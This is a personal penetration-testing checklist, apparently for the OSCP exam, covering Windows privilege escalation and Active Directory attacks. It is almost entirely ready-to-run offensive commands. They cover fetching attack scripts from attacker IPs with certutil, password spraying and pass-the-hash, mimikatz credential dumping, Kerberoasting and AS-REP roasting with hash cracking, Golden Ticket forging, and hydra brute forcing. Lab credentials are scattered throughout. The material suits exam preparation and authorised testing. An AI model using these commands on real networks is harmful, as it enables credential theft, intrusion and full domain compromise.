### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#loggingav-enumeration)[Logging/AV enumeration](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#enumeration)
Placed later down the list as its assumed this is not a factor of the OSCP exam 
- [ ]  Check [**Audit**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#audit-settings) and [**WEF**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wef) settings
- [ ]  Check [**LAPS**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#laps)
- [ ]  Check if [**WDigest**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest) is active
- [ ]  [**LSA Protection**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection)?
- [ ]  [**Credentials Guard**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-guard)[?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials)
- [ ]  [**Cached Credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials)?
- [ ]  Check if any [**AV**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/windows-av-bypass/README.md)
- [ ]  [**AppLocker Policy**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs/README.md#applocker-policy)?
- [ ]  [**UAC**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control/README.md)
- [ ]  [**User Privileges**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users-and-groups)
- [ ]  Check [**current** user **privileges**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users-and-groups)
- [ ]  Are you [**member of any privileged group**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#privileged-groups)?
- [ ]  Check if you have [any of these tokens enabled](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation): **SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege** ?
- [ ]  [**Users Sessions**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#logged-users-sessions)?
- [ ]  Check [**users homes**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#home-folders) (access?)
- [ ]  Check [**Password Policy**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#password-policy)
- [ ]  What is [**inside the Clipboard**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#get-the-content-of-the-clipboard)?

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#leaked-handlers)[Leaked Handlers](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers)
- [ ]  Have you access to any handler of a process run by administrator?

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#pipe-client-impersonation)[Pipe Client Impersonation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#named-pipe-client-impersonation)
- [ ]  Check if you can abuse it


----


# AD Enumeration
## Resources
- [CME Cheatsheet](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
- [PowerView Cheatsheet](https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet)
## Checklist
#### 00. Scanning
- [ ] Get `PowerView.ps1`
	- [ ] `CP:> certutil -urlcache -split -f http://192.168.45.202/PowerView.ps1`
	- [ ] `P:> iwr -uri http://192.168.102.227/PowerView.ps1 -Outfile PowerView.ps1
	- [ ] `P:> import-Module C:\Windows\Tasks\PowerView.ps1`
- [ ] `proxychains nmap -sT 21,22,23,25,53,80,88,135,161,389,445,8000,8080,3389,5985,3306,3307,1433,5432 -iL int_hosts.txt`
#### 01. Getting Users and Groups
- [ ] List which which users belong to groups that allow remote management? (RDP, winRM)
#### On Windows (Depends on Domain Policies)##### Net
- [ ] `net user /domain` all users in domain
- [ ] `net user username /domain` information on a domain user
- [ ] `net group /domain`
- [ ] `net group groupname /domain`

## nxc Connections and Spraying
- [ ] Target format
	- [ ] `nxc smb ms.evilcorp.org
	- [ ] `nxc smb <IP1> <IP2>
	- [ ] `nxc smb 192.168.179.0-28 10.0.0.1-67
	- [ ] `nxc smb 192.168.179.0/2 4
	- [ ] `nxc smb targets.txt`
- [ ] Can we ping out local machine? 
	- [ ] `nxc smb 192.168.102.227 -u USERNAME -p 'PASSWORD' -M test_connection -o HOST=192.168.45.202`
- [ ] Null session
	- [ ] `nxc smb 192.168.179.1 -u "" up ""`
- [ ] Connect to target using local account
	- [ ] `nxc smb 192.168.102.227 -u 'Administrator' -p 'PASSWORD' --local-auth`
- [ ] Pass the hash against a subnet
	- [ ] `nxc smb 172.16.139.0/24 -u administrator -H 'LMHASH:NTH ASH' --local-auth
	- [ ] `nxc smb 172.16.139.0/24 -u administrator -H 'NTHASH'`
- [ ] Bruteforcing and Password Spraying
	- [ ] `nxc smb 192.168.102.227 -u "admin" -p "password1"
	- [ ] `nxc smb 192.168.102.227 -u "admin" -p "password1" "password2"
	- [ ] `nxc smb 192.168.102.227 -u "admin1" "admin2" -p "P@ssword"
	- [ ] `nxc smb 192.168.102.227 -u users.txt -p passwords.txt
	- [ ] `nxc smb 192.168.102.227 -u user_file.txt -H ntlm_hashFile.txt`

## Enum
- [ ] Enumerate users
	- [ ] `sudo nxc smb 192.168.102.227 -u 'user' -p 'PASS' --users`
- [ ] Perform RID Bruteforce to get users
	- [ ] `nxc smb 192.168.102.227 -u 'user' -p 'PASS' --rid-brute`
- [ ] Enumerate domain groups
	- [ ] `nxc smb 192.168.102.227 -u 'user' -p 'PASS' --groups`
- [ ] Enumerate local users
	- [ ] `nxc smb 192.168.102.227 -u 'user' -p 'PASS' --local-users`


## Hosts
- [ ] Generate a list of relayable hosts (SMB Signing disab led)
	- [ ] `nxc smb 192.168.179.0/24 --gen-relay-list output.txt`
- [ ] Enumerate available shares
	- [ ] `nxc smb 192.168.102.227 -u 'user' -p 'PASSWORD' --local-auth --shares`
- [ ] Get the active sessions
	- [ ] `nxc smb 192.168.102.227 -u 'user' -p 'PASS' --sessions`
- [ ] Check logged in users
	- [ ] `nxc smb 192.168.102.227 -u 'user' -p 'PASS' --lusers`
- [ ] Get the password policy
	- [ ] `nxc smb 192.168.102.227 -u 'user' -p 'PASS' --pass-pol`


## Command execution
```
nxc has 3 different command execution methods (in default order) :
wmiexe`c --> WMI
atexec --> scheduled task
smbexec --> creating and running a service
```


List available modules
	- [ ] `nxc smb -L`

Module information
- [ ] `nxc smb -M mimikatz --module-info`
- [ ] `nxc smb -M spider_plus --module-info`

View module options
- [ ] `nxc smb -M mimikatz --options`

Eg Mimikatz module
- [ ] `nxc smb 192.168.102.227 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz`
- [ ] `nxc smb 192.168.102.227 -u 'Administrator' -p 'PASS' -M mimikatz`
- [ ] `nxc smb 192.168.102.227 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'`

---

# PowerView (or Powershell ) AD enum
[Cheatsheet](https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet)

# 1. General Domain Enumeration - Powerview
- [ ] General enumeration of the domain
	- [ ] `Get-Domain `
- [ ] Get details of the domain controller
	- [ ] `Get-DomainController `
	- [ ] `P:> [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | ForEach-Object { $_.Name }`
- [ ] Get the domain's password policy
	- [ ] `Get-DomainPolicy | select -ExpandProperty systemaccess`

# 2. Computer Enumeration - Powerview
- [ ] Enumerate computers and accounts
	- [ ] `Get-DomainComputer | select cn,samaccountname`
- [ ] List all computer objects
	- [ ] `Get-NetComputer`
- [ ] List all computer objects by name
	- [ ] `Get-NetComputer | select name`
- [ ] List OS and DNS hostname
	- [ ] `Get-NetComputer | select operatingsystem,dnshostname `
- [ ] Get OS and distinguished name
	- [ ] `Get-NetComputer | select name,operatingsystem,distinguishedname `
- [ ] Detailed OS enumeration
	- [ ] `Get-NetComputer | select dnshost name,operatingsystem,operatingsystemversion `
- [ ] Get IP address based on DNS hostname
	- `Resolve-IPAddress <DNS-HOSTNAME> `
- [ ] Find users with local admin rights over a machine
	- [ ] `Find-GPOComputerAdmin –Computername <ComputerName>`

# 3. User Enumeration - Powerview
- [ ] Enumerate domain users and their group memberships
	- [ ] `Get-DomainUser | select name,memberof`
- [ ] Get all details of all users
	- [ ] `Get-NetUser `
- [ ] Get all details of specific user
	- [ ] `Get-NetUser <USER_NAME>`
- [ ] Get just the usernames
	- [ ] `Get-NetUser | select cn`
- [ ] Users' last logon and password set dates
	- [ ] `Get-NetUser | select cn,pwdlastset,lastlogon`
- [ ] Enumerate service accounts for Kerberoasting
	- [ ] `Get-NetUser -SPN | select cn,samaccountname,serviceprincipalname`
		- [ ] Can we get a request a ticket to crack its hash ? Go to Kerborasting section

- [ ] List service accounts
	- [ ] `Get-DomainUser -SPN`
- [ ] Accounts vulnerable to AS-REP Roasting
	- [ ] `Get-DomainUser -PreauthNotRequired | select name`
- [ ] Change user password
	- [ ] `Set-DomainUserPassword -Identity robert -AccountPassword (ConvertTo-SecureString "Tuesday@2" -AsPlainText -Force)`

Check Admin persmission on the Domain
- [ ] `Find-LocalAdminAccess` - Search if current user has admin access to any computer on the domain

Check permissions in the SRV svc Session info Registry Key
- [ ] PS:> `Get-ACL -Path HLKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl` Get the permissions of the object



# 4. Group Enumeration - Powerview
- [ ] Enumerate all groups in the domain
	- [ ] `Get-NetGroup | select cn,name`
- [ ] List members of Domain Admins
	- [ ] `Get-NetGroup 'Domain Admins' `
- [ ] Search for groups with "admin" in their names
	- [ ] `Get-NetGroup "*admin*" | select name`
- [ ] Enumerate members of a specific group
	- [ ] `Get-NetGroup "Sales Department" | select member`
- [ ] Check nested group members for Enterprise Admins
	- [ ] `Get-NetGroup "Enterprise Admins" | select member`
- [ ] Get all members of Domain Admins
	- [ ] `Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName`
- [ ] Enumerate Domain Admins group, including nested groups
	- [ ] `Get-DomainGroupMember -Identity "Domain Admins" -Recurse
# 5. Share Enumeration - Powerview
(Investigate every share but especially the, `SYSVOL` especially if on the DC)
- [ ] Get all network shares in the current domain
	- [ ] `Get-NetShare`
- [ ] Find shares across the domain - Can take a moment
	- [ ] `Find-DomainShare`
- [ ] Find accessible shares for the current user
	- [ ] `Find-DomainShare -CheckShareAccess`
- [ ] List Sysvol shares
	- [ ] `ls \\dc1.corp.com\sysvol\corp.com\`
- [ ] Search for shares across the domain (noisy)
	- [ ] `Invoke-ShareFinder -Verbose`
- [ ] Get file servers in the domain based on SPN
	- [ ] `Get-NetFileServer -Verbose`

# 6. Session and Logon Enumeration - Powerview
- [ ] Get users logged onto the local machine
	 - [ ] `Get-NetLoggedon `
- [ ] Enumerate logged-on users
	- [ ] `Get-NetLoggedon | select username `
- [ ] Enumerate remote logged-on users, do use verbose for  details
	- [ ] `Get-NetLoggedon -ComputerName <ComputerNAME> -Verbose`
- [ ] Enumerate sessions on the local machine
	- [ ] `Get-NetSession`
- [ ] Enumerate sessions on remote machines, do use verbose for  details
	- [ ] `Get-NetSession -ComputerName <ComputerNAME> -Verbose`
- [ ] Find where domain users are logged in
	- [ ] `Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName`

# 7. Local Group Enumeration - Powerview
- [ ] Enumerate local groups on the machine
	- [ ] `Get-NetLocalGroup | Select-Object GroupName `
# 8. ACLs and Permissions - Powerview
Primarlity interested in : `ActiveDirectoryRights`, `SecurityIdentifier`
( and sometimes `ObjectSID`). 

- [ ] `Get-ObjectAcl -Identity "<USER/OBJECT/GROUP_NAME>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights` - See if we have GenericAll rights to anything usful for the target 
- [ ] Get ACLs for an object (user, computer, etc.)
	- [ ] `Get-ObjectAcl -Identity <OBJECT_NAME> `
- [ ] Filter object ACLs
	- [ ] `Get-ObjectAcl -Identity <OBJECT_NAME> | select SecurityIdentifier,ActiveDirectoryRights `
- [ ] Convert SID to readable name
	- [ ] `Convert-SidToName <SID_VALUE_LONG_STRING_ID>`
- [ ] Enumerate ACLs for the "users" group
	- [ ] `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs `
- [ ] Identify interesting ACLs for privilege escalation (noisy!)
	- [ ] `Find-InterestingDomainAcl`
- [ ] Get ACLs for a specific user
	- [ ] `Get-DomainObjectAcl -Identity <user> -ResolveGUIDs `
- [ ] Get ACLs for a specific path
	- [ ] `Get-PathAcl -Path "\\10.0.0.2\Users" `

# 9. Privilege Escalation - Powerview
- [ ] Search for high-value targets to escalate privileges 
	- [ ] `Invoke-UserHunter`
- [ ] Check if local admin on machines with high-value sessions
	- [ ] `Invoke-UserHunter [-CheckAccess]`
- [ ] Look for objects with ACE privileges
	- [ ] `Get-ObjectAcl -Identity "<AD-OBJEC T>" | ? {$_.ActiveDirectoryRights -eq "<ACE_VALUE>"} | select SecurityIdentifier,ActiveDirectoryRights`
- [ ] Convert SIDs to names for privilege escalation
	- [ ] `Convert-SidToName`
- [ ] Find ACLs with loose permissions
	- [ ] `Find-InterestingDomainAcl`
- [ ] Identify trusts with external forests
	- [ ] `Get-ForestTrust -Forest "external.local"`
- [ ] Add user to domain group (privilege escalation)
	- [ ] `net group "Management Department" stephanie /add /domain`

# 10. OU Enumeration - Powerview
- [ ] Enumerate all Organizational Units in the domain
	- [ ] `Get-NetOU`
- [ ] Search for interesting ACLs in OUs
	- [ ] `Invoke-ACLScanner -ResolveGUIDs`
	- [ ] `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}`
	- [ ] `Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<OBJECT_NAME>"}`   Could be a user, group what ever


# 11. Domain Trust Enumeration - Powerview
- [ ] Enumerate all domain trusts in the current domain
	- [ ] `Get-NetDomainTrust `
	- [ ] Enumerate trusts for a specific domain
		- [ ] `Get-NetDomainTrust -Domain <DomainName> `
	- [ ] Visualize trust relationships within the domain
		- [ ] `Get-DomainTrustMapping`
- [ ] Windows native way to check if there are any trusts 
	- [ ] `CP:> nltest /domain_trusts`
# 12. Forest Enumeration - Powerview
- [ ] Retrieve details about the current forest
	- [ ] `Get-NetForest `
- [ ] Retrieve details about a specified forest
	- [ ] `Get-NetForest -Forest <ForestName>`
- [ ] List all domains within the current forest
	- [ ] `Get-NetForestDomain `
- [ ] List all domains within a specified forest
	- [ ] `Get-NetForestDomain -Forest <ForestName> `

# 13. Global Catalog Servers - Powerview
- [ ] Identify all global catalog servers in the current forest
	- [ ] `Get-NetForestCatalog`
- [ ] Identify global catalog servers in a specified forest
	- [ ] `Get-NetForestCatalog -Forest <ForestName> `
- [ ] Add a user to the Manaement Dept
	- [ ] `net group "Management Department" stephanie /add /domain` 
		add stephan ie to the Managment Department domain group /del can be used as well as /add - Good for AD Priv esc , with Powerview
- [ ] Targetd AS-REP roasting enablement with the flag number for unsetting pre-auth on a user with GenericWrite and GenericAll
	- [ ] `Set-DomainObject -Identity "pete" -Set @{userAccountControl=4194304}`

**Test for SID you control with *genericall* on another user/group**
- [ ] `Get-ObjectAcl -Identity "robert" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
- [ ] `"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID`
- `net user username newpassword /domain`
**Kerberoastable Users**
- [ ] `Get-NetUser -Domain msp.local | Where-Object {$_.servicePrincipalName} | select name, samaccountname, serviceprincipalname`


**Computers in the domain**
- [ ] `Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem`
**List groups**
- [ ] `Get-NetGroup -Domain internal.msp.local | select name`

**Members of a group**
- [ ] `Get-DomainGroupMember "Domain Admins" -Recurse`
- [ ] Check for RDP sadowing

#### On Kali
##### SMB
###### Creds:
- [ ] `cme smb 192.168.102.227 -u 'user' -p 'PASS' -d 'oscp.exam' --users`
- [ ] `crackmapexec smb 192.168.102.227 -u 'user' -p 'PASS' --rid-brute`
- [ ] `crackmapexec smb 192.168.102.227 -u 'user' -p 'PASS' -d 'oscp.exam' --roups`
- [ ] `crackmapexec smb 192.168.102.227 -u 'user' -p 'PASS' --local-users`
- [ ] `crackmapexec smb 192.168.102.227 -u 'Administrator' -p 'PASS' --local-auth --sam`
##### LDAP
###### Creds:
- [ ] `ldapsearch -x -H ldap://192.168.102.227 -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
##### RPC
###### No Creds:
- [ ] `rpcclient -U "" -N 192.168.102.227`
###### Creds:
- [ ] `rpcclient -U "medtech.com/wario%Mushroom!" 192.168.102.227`

---
#### 02. Searching for Passwords
#### Mimikatz [cheatsheet](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)
- [ ] `PC:> mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" > MimiDump.txt`

**Requires admin permissions**
- `privilege::debug` `token::elevate`
- `sekurlsa::logonpasswords`
- `ekeys` `credman` `wdigest`
- `lsadump::sam`
- `secrets`
- `.\mimikatz.exe "token::elevate" "lsadump::secrets" exit`

### Kerberoasting With Rubeus 
(if we have discovered a Kerberoastable service OR account SPN)
- [ ] `CP:> .\Rubeus.exe kerberoast /nowrap
- [ ] `K:> john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 MSSQL.hash` Crack that shit

### Kerberoasting With Import-Module.ps1 
- [ ] `PS:> Add-Type -AssemblyName System.IdentityModel`  
- [ ] `P:> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'`
- [ ]  `CP:> certutil -urlcache -split -f http://192.168.45.202/Invoke-Kerberoast.ps1`
- [ ] `P:> Import-Module .\Invoke-Kerberoast.ps1`
- [ ] `P:> Invoke-Kerberoast` - Run as a function
- [ ] `K:> john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 MSSQL.hash` Crack that shit
- [ ] Get and then run `Invoke-RunasCs.ps1` 
	- [ ] `P:> Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"`

#### Rubeus

**Kerberoasting**
- [ ] `CP:> .\Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast`
- [ ] `CP:> ./Rubeus.exe asreproast /nowrap`


**Kerberoasting from Linux** - attack against a **TGS** for an SPN  We will need a users credentials as we are not on the the doamin. Always best to set the output file to avoid messing the hash
- [ ] `K:> sudo impacket-GetUserSPNs -request -dc-ip 192.168.102.227 -outputfile output.hashes corp.com/pete`
- [ ] `sudo hashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt --force`
**AS-REP Roasting**
- [ ] `.\Rubeus.exe asreproast /nowrap`
- [ ] `sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force`


#### Golden Tickets

[_Golden tickets_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf). : If we can get our hands on the _krbtgt_ password hash, we can create our own self-made custom TGTs (aka Golden Tickets). Obtaining the NTLM hash of the _krbtgt_ user, we can issue domain-administrative TGTs (Golden Tickets) to any existing low-privileged account, Allowing us inconspicuous legitimate access to the entire AD domain.

Steps
 - [ ] See the connection to a DC is currently denied. Expected.
	 - [ ] `C:>PsExec64.exe \\DC1 cmd.exe` 
- [ ] Set Admin Debug Rights
	- [ ] `Mz:> privilege::debug`
- [ ] dump all hashes inc the krbtgt and the DC SID
	- [ ] `Mz:> lsadump::lsa /patch`
- [ ] Clear out all existing tickets to be sure
	- [ ] `Mz:> kerberos::purge`
- [ ] mimikatz comand template to make a golde ticket
	- [ ] `Mz:> kerberos::golden /user:jen /domain:corp.com /sid:<SID-VALUE>> /krbtgt:KRBTGT-NTLM-HASH>7 /ptt`
- [ ] With the ticket in memory, launch a new shell though mimikatz
	- [ ] `Mz:> misc::cmd`
- [ ] Try accessing the DC with PSexec
	- [ ] `C:> PsExec.exe \\dc1 cmd.exe`

****
##### Cached Credentials
**Database Files**
- [ ] `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- [ ] `keepass2john Database.kdbx > Keepasshash.txt`
- [ ] `john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt`
- [ ] Move the database to `~/keepass` and interact with `kpcli`

**PowerShell history**
- [ ] P:> `Get-History`
- [ ] P:>`(Get-PSReadlineOption).HistorySavePath`
- [ ] `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (Run for each user)

**Interesting Files**
- [ ] `cmdkey /list`
- [ ]  In Users directories 
```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.log,*.xml,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

- [ ] On Filesystem `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- [ ] `sysprep.*` `unattend.*`
- [ ] `Group Policies` `gpp-decrypt <hash>`  (`sudo apt install gpp-decrypt`)

#### Check rdp Shadowing 
- [ ] Check  "Lateral Escalation" Technique  if Admin with GUI - See notes
- [ ]  Check Powerup
- [ ] Check for session for "RDP shadowing" 

#### On Kali
##### LDAP
- [ ] `ldapsearch -x -H ldap://192.168.102.227 -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
- [ ] `ldapsearch -x -H ldap://192.168.102.227 -D 'wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
##### SMB
- [ ] `crackmapexec smb 192.168.102.227 -u 'user' -p 'PASS' -d 'oscp.exam' --shares`
- [ ] `crackmapexec smb 192.168.102.227 -u 'user' -p 'PASS' --local-auth --shares`
- [ ] `crackmapexec smb 192.168.102.227 -u 'user' -p 'PASS' --sessions`
- [ ] `crackmapexec smb 192.168.102.227 -u 'user' -p 'PASS' --lusers`
##### SNMP
- [ ] `sudo nmap -sU -p 161 --script snmp-brute 192.168.102.227`
- [ ] `sudo nmap -sU -p 161 --script snmp-win32-users 192.168.102.227`
- [ ] `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.102.227`
- [ ] `snmpwalk -v 1 -c public 192.168.102.227 NET-SNMP-EXTEND-MIB::nsExtendObjects`
- [ ] `snmpwalk -v2c -c public 192.168.102.227 | grep <string>`
- STRING
- USER
- PASSWORD
- hrSWRunParameters
- -i "login\|fail"
- `-E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"`
##### Impacket
###### Kerberos
- [ ] `impacket-GetUserSPNs corp.com/meg:'VimForPowerShell123!' -dc-ip 192.168.102.227 -outputfile hashes.kerb`
###### AS-REP Roast
- [ ] `impacket-GetNPUsers corp.com/meg:'VimForPowerShell123!' -dc-ip 192.168.102.227 -outputfile dave.hash`
---
#### 03. Compile
- [ ] Make a list of users
- [ ] make sure to differentiate `local` and `domain` users!
- [ ] Make a list of hashes and passwords or anything you think might be a password
- [ ] `domain_hashes.txt`
- [ ] `domain_passwords.txt`
- [ ] Check the `password policy` to make sure you're not locking yourself out
- [ ] **On Windows:**`net accounts /domain`
- [ ] **On Kali:** `cme smb 172.16.139.10 --pass-pol` (Might need valid creds)

---
#### 04. SPRAY EVERYTHING
- specify with and without domain
- [[[Pass the Hash]]](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
#### Kerberos
**Password Spray**
- [ ] `proxychains -q /home/kali/go/bin/kerbrute passwordspray -d oscp.exam users.txt hghgib6vHT3bVWf --dc <DC_IP> -vvv`
**Bruteforce**
- [ ] `proxychains -q /home/kali/go/bin/kerbrute bruteuser -d oscp.exam jeffadmin passwords.txt --dc <DC_IP> -vvv`
#### SMB
- [ ] `proxychains -q /home/kali/.local/bin/cme smb 172.16.139.10-14 172.16.139.82-83 -u users.txt -p passwords.txt -d medtech.com --continue-on-success`
- [ ] `proxychains -q /home/kali/.local/bin/cme smb 172.16.139.10-14 172.16.139.82-83 -u users.txt -p passwords.txt --continue-on-success`
- [ ] `cme smb 192.168.102.227 -u users.txt -H '<HASH>' --continue-on-success`
- [ ] `cme smb 192.168.102.227 -u users.txt -p passwords.txt --continue-on-success --local-auth`
#### RDP
- [ ] `hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt rdp://192.168.102.227:3389 -u -vV -T 40 -I`
- [ ] `hydra -V -f -L users.txt -P passwords.txt rdp://192.168.102.227 -u -vV -T 40 -I`
#### WinRM
- [ ] `evil-winrm -i 192.168.102.227 -u jeffadmin -p 'password'`
- [ ] `evil-winrm -i 192.168.102.227 -u jeffadmin -H 'HASH'`
#### FTP
- [ ] `hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ftp://192.168.102.227:21 -u -vV -T 40 -I`
#### SSH
- [ ] `hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.102.227:22 -u -vV -T 40 -I`
## SMB Server (Windows)
If you can't move file from Kali to the internal network, you can create a new share on DMZ.
- [ ] Need Administrator+ on **M1**
- [ ] Make sure to transfer the files into C:\temp you want to host

**On M1:**
- [ ] `mkdir C:\temp`
- [ ] `New-SmbSHare -Name 'temp' -Path 'C:\temp' -FullAccess everyone`

**On M2:**
- [ ] `net use \\192.168.102.227\temp`
- [ ] `copy \\192.168.102.227\temp\nc.exe C:\nc.exe`
----

- [Attacking Active Directory](https://swisskyrepo.github.io/InternalAllTheThings/) 


# Im stuck . What the fuck!
## SPRAY EVERYTHING
- [ ] Find a new user? `ADD IT TO USERS.TXT`
- [ ] Find a new password? or something that *might* be a password? `ADD IT TO PASSWORDS.TXT`
- [ ] `SPRAY SPRAY SPRAY`
- [ ] FTP, SSH, CME, SMB, KERBEROS, ADMIN CONSOLES, ANYTHING THAT ACCEPTS CREDENTIALS JUST TRY IT
## TRY DEFAULT CREDS AND DUMB CREDS
- [ ] Find a software you've never heard of? `SEARCH FOR DEFAULT CREDENTIALS`
- [ ] Find a software you have heard of? `SEARCH FOR DEFAULT CREDENTIALS`
- [ ] Find a new user? `TRY THE USERNAME AS THE PASSWORD` `user:user` `admin:admin`
- [ ] Can't crack a password? `TRY THE USERNAME AS THE PASSWORD`
## TRY ALTERNATE CRACKING TECHNIQUES
- [ ] Hashcat didn't work? Tried with rules? `TRY IT WITH JOHN, TRY IT WITH CRACKSTATION`
- [ ] John didn't work? `TRY IT WITH HASHCAT, TRY IT WITH CRACKSTATION`
- [ ] Crackstation didn't work? `TRY IT WITH HASHCAT, TRY IT WITH JOHN`
- [ ] An exploit runs but doesn't PE. Try running it from elsewhere in the machine.
## TAKE A BREATH AND START FROM THE TOP OF THE CHECKLIST YOU PROBABLY MISSED SOMETHING EASY

## TAKE A FUCKING BREAK
## DRINK SOME FUCKING WATER

## EAT SOME FUCKING FOOD

## MOVE ON TO SOMETHING ELSE AND COME BACK LATER

## AHHHHHHHHHHHHHHHHHHHHHHHH